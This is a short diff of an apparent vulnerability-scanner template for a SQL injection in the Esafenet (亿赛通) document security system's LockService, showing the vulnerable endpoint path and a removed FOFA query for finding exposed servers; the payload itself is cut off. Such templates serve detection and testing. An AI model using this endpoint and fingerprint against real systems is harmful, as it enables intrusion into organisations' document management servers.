@@ -3,12 +3,8 @@ info:
   name: 亿赛通电子文档安全管理系统LockService存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wz1lbcvzgg28al12'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wz1lbcvzgg28al12
-    fofa: body="/CDGServer3/index.jsp" && title!="DLP"
 http:
 - raw:
   - 'POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1
